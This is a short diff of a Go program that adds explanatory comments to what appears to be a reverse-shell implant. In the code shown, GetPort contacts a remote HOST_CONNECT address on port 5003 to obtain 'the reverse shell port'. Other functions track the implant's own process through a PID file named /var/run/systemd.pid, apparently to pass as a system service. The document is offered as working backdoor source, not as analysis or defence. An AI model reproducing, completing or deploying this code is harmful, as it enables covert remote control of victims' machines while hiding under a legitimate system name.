@@ -34,6 +34,7 @@ func main() {
 }
 
 func GetPort() string {
+	//Get the reverse shell port from the server
 	getPort, err := net.Dial("tcp", HOST_CONNECT+"5003")
 	if err != nil {
 		fmt.Println("Couldn't get connection")
@@ -65,27 +66,30 @@ func CheckFileExists(file string) bool {
 }
 
 func CheckPid(pid int) bool {
+	//Send a kill signal to the PID to see if the process is running or not
 	out, err := exec.Command("kill", "-s", "0", strconv.Itoa(pid)).CombinedOutput()
 	if err != nil {
 		log.Println(err)
 	}
 	if string(out) == "" {
-		//IT RUNNING
+		//Process is running
 		return true
 	}
-	//IT NO RUNNING
+	//Process is not running
 	return false
 }
 
 func FindProcess() bool {
-	//Test to see if process is already running
+	//See if the pid file exists
 	if !CheckFileExists("/var/run/systemd.pid") {
 		return false
 	}
+	//If it does, read the file to get the pids
 	dat, err := ioutil.ReadFile("/var/run/systemd.pid")
 	if err != nil {
 		return false
 	}
+	//Process and return the pid
 	pid := string(dat)
 	pid = strings.TrimSuffix(pid, "\n")
 	fmt.Printf("PID: " + pid)
